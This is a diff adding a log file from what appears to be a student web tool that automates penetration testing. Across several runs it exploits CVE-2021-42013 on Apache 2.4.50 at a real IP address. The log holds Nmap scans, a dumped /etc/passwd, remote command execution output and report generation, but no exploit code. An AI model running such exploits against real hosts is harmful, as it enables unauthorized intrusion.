@@ -1,0 +1,2121 @@
+2024-07-07 14:36:15,611 WARNING  * Debugger is active!
+2024-07-07 14:36:15,620 INFO  * Debugger PIN: 860-226-893
+2024-07-07 14:36:23,156 INFO 127.0.0.1 - - [07/Jul/2024 14:36:23] "GET / HTTP/1.1" 200 -
+2024-07-07 14:36:23,356 INFO 127.0.0.1 - - [07/Jul/2024 14:36:23] "[36mGET /static/styles.css HTTP/1.1[0m" 304 -
+2024-07-07 14:36:26,073 INFO 127.0.0.1 - - [07/Jul/2024 14:36:26] "[32mPOST /select_tool HTTP/1.1[0m" 302 -
+2024-07-07 14:36:26,176 INFO 127.0.0.1 - - [07/Jul/2024 14:36:26] "GET /apache_form HTTP/1.1" 200 -
+2024-07-07 14:36:26,216 INFO 127.0.0.1 - - [07/Jul/2024 14:36:26] "[36mGET /static/styles.css HTTP/1.1[0m" 304 -
+2024-07-07 14:36:29,103 INFO Running Apache exploit on 152.42.212.132:889 with vulnerability both
+2024-07-07 14:37:09,076 INFO Nmap scan result: Starting Nmap 7.94 ( https://nmap.org ) at 2024-07-07 14:36 SE Asia Standard Time
+Nmap scan report for 152.42.212.132
+Host is up (0.048s latency).
+
+PORT    STATE SERVICE VERSION
+889/tcp open  http    Apache httpd 2.4.50 ((Unix))
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.4.50 (Unix)
+|_http-title: Site doesn't have a title (text/html).
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 39.69 seconds
+
+2024-07-07 14:37:09,076 INFO Found Apache ports: ['889']
+2024-07-07 14:37:09,076 INFO Checking vulnerabilities on http://152.42.212.132:889
+2024-07-07 14:37:09,095 DEBUG Starting new HTTP connection (1): 152.42.212.132:889
+2024-07-07 14:37:09,175 DEBUG http://152.42.212.132:889 "HEAD / HTTP/11" 200 0
+2024-07-07 14:37:09,264 DEBUG Starting new HTTP connection (1): 152.42.212.132:889
+2024-07-07 14:37:09,351 DEBUG http://152.42.212.132:889 "HEAD / HTTP/11" 200 0
+2024-07-07 14:37:31,853 INFO Vulnerability findings: http://152.42.212.132:889 is vulnerable to Path Traversal Attack (CVE-2021-42013)
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+
+http://152.42.212.132:889 is vulnerable to Remote Code Execution attack (CVE-2021-42013)
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+
+[+] whoami:
+
+[+] ls:
+
+[+] pwd:
+
+[+] uname -a:
+
+
+2024-07-07 14:37:32,125 INFO Header added successfully.
+2024-07-07 14:37:32,153 INFO Cover page created successfully.
+2024-07-07 14:37:32,264 INFO DOCX report saved at static\output\Penetration_Test_Report_Apache.docx
+2024-07-07 14:37:32,288 ERROR Error generating report: [WinError 2] The system cannot find the file specified
+2024-07-07 14:37:32,289 INFO Process completed in 63.18490147590637 seconds.
+2024-07-07 14:37:32,289 ERROR Error generating report.
+2024-07-07 14:37:32,321 INFO 127.0.0.1 - - [07/Jul/2024 14:37:32] "POST /run_apache HTTP/1.1" 200 -
+2024-07-07 14:37:32,348 INFO 127.0.0.1 - - [07/Jul/2024 14:37:32] "[36mGET /static/styles.css HTTP/1.1[0m" 304 -
+2024-07-07 16:49:28,559 INFO [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on http://127.0.0.1:5000
+2024-07-07 16:49:28,559 INFO [33mPress CTRL+C to quit[0m
+2024-07-07 16:49:28,567 INFO  * Restarting with stat
+2024-07-07 16:49:31,167 WARNING  * Debugger is active!
+2024-07-07 16:49:31,180 INFO  * Debugger PIN: 860-226-893
+2024-07-07 16:49:37,373 INFO 127.0.0.1 - - [07/Jul/2024 16:49:37] "GET / HTTP/1.1" 200 -
+2024-07-07 16:49:37,570 INFO 127.0.0.1 - - [07/Jul/2024 16:49:37] "GET /static/styles.css HTTP/1.1" 200 -
+2024-07-07 16:49:37,638 INFO 127.0.0.1 - - [07/Jul/2024 16:49:37] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+2024-07-07 16:50:34,133 INFO 127.0.0.1 - - [07/Jul/2024 16:50:34] "[32mPOST /select_tool HTTP/1.1[0m" 302 -
+2024-07-07 16:50:34,183 INFO 127.0.0.1 - - [07/Jul/2024 16:50:34] "GET /apache_form HTTP/1.1" 200 -
+2024-07-07 16:50:34,225 INFO 127.0.0.1 - - [07/Jul/2024 16:50:34] "[36mGET /static/styles.css HTTP/1.1[0m" 304 -
+2024-07-07 16:50:55,696 INFO Running Apache exploit on 152.42.212.132:889 with vulnerability both
+2024-07-07 16:51:33,136 INFO Nmap scan result: Starting Nmap 7.94 ( https://nmap.org ) at 2024-07-07 16:50 SE Asia Standard Time
+Nmap scan report for 152.42.212.132
+Host is up (0.046s latency).
+
+PORT    STATE SERVICE VERSION
+889/tcp open  http    Apache httpd 2.4.50 ((Unix))
+|_http-title: Site doesn't have a title (text/html).
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.4.50 (Unix)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 37.24 seconds
+
+2024-07-07 16:51:33,136 INFO Found Apache ports: ['889']
+2024-07-07 16:51:33,136 INFO Checking vulnerabilities on http://152.42.212.132:889
+2024-07-07 16:51:33,159 DEBUG Starting new HTTP connection (1): 152.42.212.132:889
+2024-07-07 16:51:33,256 DEBUG http://152.42.212.132:889 "HEAD / HTTP/11" 200 0
+2024-07-07 16:51:33,369 DEBUG Starting new HTTP connection (1): 152.42.212.132:889
+2024-07-07 16:51:33,437 DEBUG http://152.42.212.132:889 "HEAD / HTTP/11" 200 0
+2024-07-07 16:51:55,891 INFO Vulnerability findings: http://152.42.212.132:889 is vulnerable to Path Traversal Attack (CVE-2021-42013)
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+
+http://152.42.212.132:889 is vulnerable to Remote Code Execution attack (CVE-2021-42013)
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+
+[+] whoami:
+
+[+] ls:
+
+[+] pwd:
+
+[+] uname -a:
+
+
+2024-07-07 16:51:55,984 INFO Header added successfully.
+2024-07-07 16:51:56,000 INFO Cover page created successfully.
+2024-07-07 16:51:56,069 INFO DOCX report saved at static\output\Penetration_Test_Report_Apache.docx
+2024-07-07 16:51:56,070 INFO Process completed in 60.374505043029785 seconds.
+2024-07-07 16:51:56,083 INFO 127.0.0.1 - - [07/Jul/2024 16:51:56] "POST /run_apache HTTP/1.1" 200 -
+2024-07-07 16:51:56,095 INFO 127.0.0.1 - - [07/Jul/2024 16:51:56] "[36mGET /static/styles.css HTTP/1.1[0m" 304 -
+2024-07-07 16:52:54,821 INFO 127.0.0.1 - - [07/Jul/2024 16:52:54] "[33mGET /static/output\\Penetration_Test_Report_Apache.pdf HTTP/1.1[0m" 404 -
+2024-07-07 17:05:23,135 INFO  * Detected change in 'D:\\tugas_akhir_final\\apache\\scanner.py', reloading
+2024-07-07 17:05:23,377 INFO  * Restarting with stat
+2024-07-07 17:05:25,086 WARNING  * Debugger is active!
+2024-07-07 17:05:25,100 INFO  * Debugger PIN: 860-226-893
+2024-07-07 17:05:26,225 INFO  * Detected change in 'D:\\tugas_akhir_final\\main.py', reloading
+2024-07-07 17:05:26,369 INFO  * Restarting with stat
+2024-07-07 17:05:27,927 WARNING  * Debugger is active!
+2024-07-07 17:05:27,934 INFO  * Debugger PIN: 860-226-893
+2024-07-07 17:05:29,543 INFO 127.0.0.1 - - [07/Jul/2024 17:05:29] "GET / HTTP/1.1" 200 -
+2024-07-07 17:05:29,684 INFO 127.0.0.1 - - [07/Jul/2024 17:05:29] "[36mGET /static/styles.css HTTP/1.1[0m" 304 -
+2024-07-07 17:05:32,053 INFO 127.0.0.1 - - [07/Jul/2024 17:05:32] "[32mPOST /select_tool HTTP/1.1[0m" 302 -
+2024-07-07 17:05:32,086 INFO 127.0.0.1 - - [07/Jul/2024 17:05:32] "GET /apache_form HTTP/1.1" 200 -
+2024-07-07 17:05:32,102 INFO 127.0.0.1 - - [07/Jul/2024 17:05:32] "[36mGET /static/styles.css HTTP/1.1[0m" 304 -
+2024-07-07 17:05:35,063 INFO Running Apache exploit on 152.42.212.132:889 with vulnerability both
+2024-07-07 17:05:59,346 INFO Nmap scan result: Starting Nmap 7.94 ( https://nmap.org ) at 2024-07-07 17:05 SE Asia Standard Time
+Nmap scan report for 152.42.212.132
+Host is up.
+
+PORT    STATE    SERVICE VERSION
+889/tcp filtered unknown
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 24.09 seconds
+
+2024-07-07 17:05:59,347 INFO Found Apache ports: []
+2024-07-07 17:05:59,347 INFO Vulnerability findings: 
+2024-07-07 17:05:59,383 INFO Header added successfully.
+2024-07-07 17:05:59,401 INFO Cover page created successfully.
+2024-07-07 17:05:59,480 INFO DOCX report saved at static\output\Penetration_Test_Report_Apache.docx
+2024-07-07 17:05:59,480 INFO Process completed in 24.417117595672607 seconds.
+2024-07-07 17:05:59,483 INFO 127.0.0.1 - - [07/Jul/2024 17:05:59] "POST /run_apache HTTP/1.1" 200 -
+2024-07-07 17:05:59,493 INFO 127.0.0.1 - - [07/Jul/2024 17:05:59] "[36mGET /static/styles.css HTTP/1.1[0m" 304 -
+2024-07-07 17:06:04,951 INFO 127.0.0.1 - - [07/Jul/2024 17:06:04] "[33mGET /static/output\\Penetration_Test_Report_Apache.docx HTTP/1.1[0m" 404 -
+2024-07-07 17:06:08,443 INFO 127.0.0.1 - - [07/Jul/2024 17:06:08] "[33mGET /static/output\\Penetration_Test_Report_Apache.docx HTTP/1.1[0m" 404 -
+2024-07-07 17:06:28,272 INFO 127.0.0.1 - - [07/Jul/2024 17:06:28] "GET / HTTP/1.1" 200 -
+2024-07-07 17:06:28,290 INFO 127.0.0.1 - - [07/Jul/2024 17:06:28] "[36mGET /static/styles.css HTTP/1.1[0m" 304 -
+2024-07-07 17:06:30,965 INFO 127.0.0.1 - - [07/Jul/2024 17:06:30] "[32mPOST /select_tool HTTP/1.1[0m" 302 -
+2024-07-07 17:06:31,007 INFO 127.0.0.1 - - [07/Jul/2024 17:06:31] "GET /apache_form HTTP/1.1" 200 -
+2024-07-07 17:06:31,063 INFO 127.0.0.1 - - [07/Jul/2024 17:06:31] "[36mGET /static/styles.css HTTP/1.1[0m" 304 -
+2024-07-07 17:06:33,944 INFO Running Apache exploit on 152.42.212.132:889 with vulnerability both
+2024-07-07 17:06:58,117 INFO Nmap scan result: Starting Nmap 7.94 ( https://nmap.org ) at 2024-07-07 17:06 SE Asia Standard Time
+Nmap scan report for 152.42.212.132
+Host is up.
+
+PORT    STATE    SERVICE VERSION
+889/tcp filtered unknown
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 24.07 seconds
+
+2024-07-07 17:06:58,117 INFO Found Apache ports: []
+2024-07-07 17:06:58,117 INFO Vulnerability findings: 
+2024-07-07 17:06:58,159 INFO Header added successfully.
+2024-07-07 17:06:58,174 INFO Cover page created successfully.
+2024-07-07 17:06:58,296 INFO DOCX report saved at static\output\Penetration_Test_Report_Apache.docx
+2024-07-07 17:06:58,296 INFO Process completed in 24.352781772613525 seconds.
+2024-07-07 17:06:58,345 INFO 127.0.0.1 - - [07/Jul/2024 17:06:58] "POST /run_apache HTTP/1.1" 200 -
+2024-07-07 17:06:58,377 INFO 127.0.0.1 - - [07/Jul/2024 17:06:58] "[36mGET /static/styles.css HTTP/1.1[0m" 304 -
+2024-07-07 17:07:03,823 INFO 127.0.0.1 - - [07/Jul/2024 17:07:03] "[33mGET /static/output\\Penetration_Test_Report_Apache.docx HTTP/1.1[0m" 404 -
+2024-07-07 17:09:39,038 INFO  * Detected change in 'D:\\tugas_akhir_final\\apache\\scanner.py', reloading
+2024-07-07 17:09:39,263 INFO  * Restarting with stat
+2024-07-07 17:09:40,946 WARNING  * Debugger is active!
+2024-07-07 17:09:40,953 INFO  * Debugger PIN: 860-226-893
+2024-07-07 17:09:42,483 INFO 127.0.0.1 - - [07/Jul/2024 17:09:42] "GET / HTTP/1.1" 200 -
+2024-07-07 17:09:42,688 INFO 127.0.0.1 - - [07/Jul/2024 17:09:42] "[36mGET /static/styles.css HTTP/1.1[0m" 304 -
+2024-07-07 17:09:44,683 INFO 127.0.0.1 - - [07/Jul/2024 17:09:44] "[32mPOST /select_tool HTTP/1.1[0m" 302 -
+2024-07-07 17:09:44,718 INFO 127.0.0.1 - - [07/Jul/2024 17:09:44] "GET /apache_form HTTP/1.1" 200 -
+2024-07-07 17:09:44,748 INFO 127.0.0.1 - - [07/Jul/2024 17:09:44] "[36mGET /static/styles.css HTTP/1.1[0m" 304 -
+2024-07-07 17:09:47,013 INFO Running Apache exploit on 152.42.212.132:889 with vulnerability both
+2024-07-07 17:10:22,303 INFO Nmap scan result: Starting Nmap 7.94 ( https://nmap.org ) at 2024-07-07 17:09 SE Asia Standard Time
+Nmap scan report for 152.42.212.132
+Host is up (0.45s latency).
+
+PORT    STATE SERVICE VERSION
+889/tcp open  http    Apache httpd 2.4.50 ((Unix))
+|_http-server-header: Apache/2.4.50 (Unix)
+|_http-title: Site doesn't have a title (text/html).
+| http-methods: 
+|_  Potentially risky methods: TRACE
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 35.15 seconds
+
+2024-07-07 17:10:22,304 INFO Found Apache ports: ['889']
+2024-07-07 17:10:22,304 INFO Checking vulnerabilities on http://152.42.212.132:889
+2024-07-07 17:10:22,314 DEBUG Starting new HTTP connection (1): 152.42.212.132:889
+2024-07-07 17:10:22,396 DEBUG http://152.42.212.132:889 "HEAD / HTTP/11" 200 0
+2024-07-07 17:10:22,495 DEBUG Starting new HTTP connection (1): 152.42.212.132:889
+2024-07-07 17:10:22,574 DEBUG http://152.42.212.132:889 "HEAD / HTTP/11" 200 0
+2024-07-07 17:10:44,917 INFO Vulnerability findings: http://152.42.212.132:889 is vulnerable to Path Traversal Attack (CVE-2021-42013)
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+
+http://152.42.212.132:889 is vulnerable to Remote Code Execution attack (CVE-2021-42013)
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+
+[+] whoami:
+
+[+] ls:
+
+[+] pwd:
+
+[+] uname -a:
+
+
+2024-07-07 17:10:44,963 INFO Header added successfully.
+2024-07-07 17:10:44,977 INFO Cover page created successfully.
+2024-07-07 17:10:45,147 INFO DOCX report saved at static\output\Penetration_Test_Report_Apache.docx
+2024-07-07 17:10:45,152 INFO Process completed in 58.13885498046875 seconds.
+2024-07-07 17:10:45,166 INFO 127.0.0.1 - - [07/Jul/2024 17:10:45] "POST /run_apache HTTP/1.1" 200 -
+2024-07-07 17:10:45,196 INFO 127.0.0.1 - - [07/Jul/2024 17:10:45] "[36mGET /static/styles.css HTTP/1.1[0m" 304 -
+2024-07-07 17:10:47,294 INFO 127.0.0.1 - - [07/Jul/2024 17:10:47] "[33mGET /static/output\\Penetration_Test_Report_Apache.docx HTTP/1.1[0m" 404 -
+2024-07-07 17:13:46,882 INFO  * Detected change in 'D:\\tugas_akhir_final\\main.py', reloading
+2024-07-07 17:13:47,002 INFO  * Restarting with stat
+2024-07-07 17:13:48,250 WARNING  * Debugger is active!
+2024-07-07 17:13:48,254 INFO  * Debugger PIN: 860-226-893
+2024-07-07 17:13:49,423 INFO  * Detected change in 'D:\\tugas_akhir_final\\apache\\generate_report_apache.py', reloading
+2024-07-07 17:13:49,503 INFO  * Restarting with stat
+2024-07-07 17:13:50,853 WARNING  * Debugger is active!
+2024-07-07 17:13:50,864 INFO  * Debugger PIN: 860-226-893
+2024-07-07 17:13:52,080 INFO 127.0.0.1 - - [07/Jul/2024 17:13:52] "GET / HTTP/1.1" 200 -
+2024-07-07 17:13:52,196 INFO 127.0.0.1 - - [07/Jul/2024 17:13:52] "[36mGET /static/styles.css HTTP/1.1[0m" 304 -
+2024-07-07 17:13:55,755 INFO 127.0.0.1 - - [07/Jul/2024 17:13:55] "[32mPOST /select_tool HTTP/1.1[0m" 302 -
+2024-07-07 17:13:55,796 INFO 127.0.0.1 - - [07/Jul/2024 17:13:55] "GET /apache_form HTTP/1.1" 200 -
+2024-07-07 17:13:55,840 INFO 127.0.0.1 - - [07/Jul/2024 17:13:55] "[36mGET /static/styles.css HTTP/1.1[0m" 304 -
+2024-07-07 17:13:58,753 INFO Running Apache exploit on 152.42.212.132:889 with vulnerability both
+2024-07-07 17:14:33,365 INFO Nmap scan result: Starting Nmap 7.94 ( https://nmap.org ) at 2024-07-07 17:13 SE Asia Standard Time
+Nmap scan report for 152.42.212.132
+Host is up (0.048s latency).
+
+PORT    STATE SERVICE VERSION
+889/tcp open  http    Apache httpd 2.4.50 ((Unix))
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: Apache/2.4.50 (Unix)
+| http-methods: 
+|_  Potentially risky methods: TRACE
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 34.49 seconds
+
+2024-07-07 17:14:33,365 INFO Found Apache ports: ['889']
+2024-07-07 17:14:33,365 INFO Checking vulnerabilities on http://152.42.212.132:889
+2024-07-07 17:14:33,375 DEBUG Starting new HTTP connection (1): 152.42.212.132:889
+2024-07-07 17:14:33,453 DEBUG http://152.42.212.132:889 "HEAD / HTTP/11" 200 0
+2024-07-07 17:14:33,549 DEBUG Starting new HTTP connection (1): 152.42.212.132:889
+2024-07-07 17:14:33,648 DEBUG http://152.42.212.132:889 "HEAD / HTTP/11" 200 0
+2024-07-07 17:14:56,013 INFO Vulnerability findings: http://152.42.212.132:889 is vulnerable to Path Traversal Attack (CVE-2021-42013)
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+
+http://152.42.212.132:889 is vulnerable to Remote Code Execution attack (CVE-2021-42013)
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+
+[+] whoami:
+
+[+] ls:
+
+[+] pwd:
+
+[+] uname -a:
+
+
+2024-07-07 17:14:56,042 INFO Header added successfully.
+2024-07-07 17:14:56,050 INFO Cover page created successfully.
+2024-07-07 17:14:56,113 INFO DOCX report saved at static\output\Penetration_Test_Report_Apache.docx
+2024-07-07 17:14:56,113 INFO Process completed in 57.36963772773743 seconds.
+2024-07-07 17:14:56,119 INFO 127.0.0.1 - - [07/Jul/2024 17:14:56] "POST /run_apache HTTP/1.1" 200 -
+2024-07-07 17:14:56,130 INFO 127.0.0.1 - - [07/Jul/2024 17:14:56] "[36mGET /static/styles.css HTTP/1.1[0m" 304 -
+2024-07-07 17:16:54,348 INFO 127.0.0.1 - - [07/Jul/2024 17:16:54] "GET /static/output/Penetration_Test_Report_Apache.docx HTTP/1.1" 200 -
+2024-07-07 17:17:21,493 INFO 127.0.0.1 - - [07/Jul/2024 17:17:21] "GET / HTTP/1.1" 200 -
+2024-07-07 17:17:21,544 INFO 127.0.0.1 - - [07/Jul/2024 17:17:21] "[36mGET /static/styles.css HTTP/1.1[0m" 304 -
+2024-07-07 17:17:24,546 INFO 127.0.0.1 - - [07/Jul/2024 17:17:24] "[32mPOST /select_tool HTTP/1.1[0m" 302 -
+2024-07-07 17:17:24,564 INFO 127.0.0.1 - - [07/Jul/2024 17:17:24] "GET /apache_form HTTP/1.1" 200 -
+2024-07-07 17:17:24,580 INFO 127.0.0.1 - - [07/Jul/2024 17:17:24] "[36mGET /static/styles.css HTTP/1.1[0m" 304 -
+2024-07-07 17:17:30,308 INFO Running Apache exploit on 152.42.212.132: with vulnerability both
+2024-07-07 17:26:46,637 INFO  * Detected change in 'D:\\tugas_akhir_final\\apache\\generate_report_apache.py', reloading
+2024-07-07 17:26:46,754 INFO  * Restarting with stat
+2024-07-07 17:26:48,758 WARNING  * Debugger is active!
+2024-07-07 17:26:48,774 INFO  * Debugger PIN: 860-226-893
+2024-07-07 17:26:48,924 INFO Running Apache exploit on 152.42.212.132: with vulnerability both
+2024-07-07 17:28:42,156 INFO 127.0.0.1 - - [07/Jul/2024 17:28:42] "GET /apache_form HTTP/1.1" 200 -
+2024-07-07 17:28:42,453 INFO 127.0.0.1 - - [07/Jul/2024 17:28:42] "[36mGET /static/styles.css HTTP/1.1[0m" 304 -
+2024-07-07 17:28:46,333 INFO Running Apache exploit on 152.42.212.132: with vulnerability both
+2024-07-07 17:37:21,056 INFO Nmap scan result: Starting Nmap 7.94 ( https://nmap.org ) at 2024-07-07 17:29 SE Asia Standard Time
+80/tcp    open     http?
+|_http-title: Welcome to nginx!
+889/tcp   open     http            Apache httpd 2.4.50 ((Unix))
+| http-methods: 
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: Apache/2.4.50 (Unix)
+3790/tcp  open     http            nginx
+|_http-title: Did not follow redirect to https://152.42.212.132:3790/
+|     HTTP/1.1 302 Found
+|   HTTPOptions, RTSPRequest: 
+|     HTTP/1.1 404 Not Found
+|_  http/1.1
+|     HTTP/1.0 401 Unauthorized
+|     HTTP/1.0 401 Unauthorized
+|   HTTPOptions: 
+|     HTTP/1.0 200 OK
+|_    {"error":{"root_cause":[{"type":"illegal_argument_exception","reason":"Unexpected http protocol version: RTSP/1.0"}],"type":"illegal_argument_exception","reason":"Unexpected http protocol version: RTSP/1.0"},"status":400}
+|     HTTP/1.0 400 Bad Request
+|     Puma caught this error: Invalid HTTP format, parsing fails. Are you trying to open an SSL connection to a non-SSL Puma? (Puma::HttpParserError)
+|     org/jruby/puma/Http11.java:200:in `execute'
+|     HTTP/1.0 200 OK
+|     {"host":"751247e67e9c","version":"8.13.4","http_address":"0.0.0.0:9600","id":"76e96a99-e805-4b63-97aa-b1561d4654a2","name":"logstash","ephemeral_id":"3a890be7-70bc-4622-84b9-4c22678de0ef","status":"green","snapshot":false,"pipeline":{"workers":4,"batch_size":125,"batch_delay":50},"build_date":"2024-05-06T13:04:36+00:00","build_sha":"80e67bc73d1dede7d683c72df122fc6be5d47d1b","build_snapshot":false}
+|   HTTPOptions: 
+|     HTTP/1.0 404 Not Found
+|     HTTP/1.0 400 Bad Request
+|     Puma caught this error: Invalid HTTP format, parsing fails. Are you trying to open an SSL connection to a non-SSL Puma? (Puma::HttpParserError)
+|     org/jruby/puma/Http11.java:200:in `execute'
+|_    /usr/share/logstash/vendor/bundle/jruby/3.1.0/gems/puma-6.4.2-java/lib/puma/thread_pool.rb:155:in `block in spawn_thread'HTTP/1.1 400 Bad Request
+4 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF:dows%r(GetRequest,2B3,"HTTP/1\.1\x20302\x20Found\r\nlocation:\x20/login
+SF:\x20close\r\n\r\n")%r(HTTPOptions,308,"HTTP/1\.1\x20404\x20Not\x20Found
+SF:r(RTSPRequest,308,"HTTP/1\.1\x20404\x20Not\x20Found\r\nX-Content-Type-O
+SF:dows%r(GetRequest,29C,"HTTP/1\.0\x20401\x20Unauthorized\r\nWWW-Authenti
+SF:\]}},\"status\":401}")%r(HTTPOptions,89,"HTTP/1\.0\x20200\x20OK\r\nAllo
+SF:_argument_exception\",\"reason\":\"Unexpected\x20http\x20protocol\x20ve
+SF:on\":\"Unexpected\x20http\x20protocol\x20version:\x20RTSP/1\.0\"},\"sta
+SF:tus\":400}")%r(FourOhFourRequest,2E2,"HTTP/1\.0\x20401\x20Unauthorized\
+SF:(GenericLines,42A,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nContent-Length
+SF::\x20989\r\n\r\nPuma\x20caught\x20this\x20error:\x20Invalid\x20HTTP\x20
+SF:an\x20SSL\x20connection\x20to\x20a\x20non-SSL\x20Puma\?\x20\(Puma::Http
+SF:ParserError\)\norg/jruby/puma/Http11\.java:200:in\x20`execute'\n/usr/sh
+SF:va/lib/puma/")%r(GetRequest,1F9,"HTTP/1\.0\x20200\x20OK\r\nContent-Type
+SF:\",\"http_address\":\"0\.0\.0\.0:9600\",\"id\":\"76e96a99-e805-4b63-97a
+SF:83c72df122fc6be5d47d1b\",\"build_snapshot\":false}")%r(HTTPOptions,B9,"
+SF:HTTP/1\.0\x20404\x20Not\x20Found\r\nX-Cascade:\x20pass\r\nContent-Type:
+SF:\":\"Not\x20Found\"}}")%r(RTSPRequest,337,"HTTP/1\.0\x20400\x20Bad\x20R
+SF::\x20Invalid\x20HTTP\x20format,\x20parsing\x20fails\.\x20Are\x20you\x20
+SF:20Puma\?\x20\(Puma::HttpParserError\)\norg/jruby/puma/Http11\.java:200:
+SF:ib/puma/thread_pool\.rb:155:in\x20`block\x20in\x20spawn_thread'HTTP/1\.
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+2024-07-07 17:37:21,059 INFO Found Apache ports: ['80', '889', '3790']
+2024-07-07 17:37:21,059 INFO Checking vulnerabilities on http://152.42.212.132:80
+2024-07-07 17:37:21,143 DEBUG Starting new HTTP connection (1): 152.42.212.132:80
